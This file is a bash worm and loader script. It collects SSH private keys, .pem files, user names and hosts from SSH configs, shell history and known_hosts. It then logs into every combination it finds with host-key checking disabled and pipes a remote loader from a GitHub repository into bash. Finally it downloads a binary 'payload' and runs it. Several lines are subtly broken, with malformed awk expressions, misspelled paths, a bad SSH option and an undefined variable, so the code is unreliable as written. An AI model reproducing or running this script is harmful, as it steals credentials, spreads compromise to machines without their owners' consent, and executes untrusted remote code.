export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin


ssh_spread() {
KEYS1=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '(print $2 )')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)

HOSTS1=$(cat ~/.ssh/contig /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '(print $2)')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known hosts | grep -oP "([0-9]{1,3}\.){3}[0-9](1,3)" | uniq)

USERZ=$(
    echo root
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '(print $3}' | uniq | grep -v "\.ssh"
)

users=$(echo $USERZ | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
hosts=$(echo "$HOSTS1 $HOSTS2 $HOSTS3" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
keys=$(echo "$KEYS $KEYS2 $KEYS3" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)

for user in $users; do
    for host in $hosts; do
        for key in $keys; do
            chmod +r $key; chmod 400 $key

            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash"
        done
    done
done
}

curl -L -o payload https://github.com/proxin187/lapras/raw/refs/heads/main/payload || wget -q --no-check-certificate -O payload https://github.com/proxin187/lapras/raw/refs/heads/main/payload

chmod +x payload

./payload


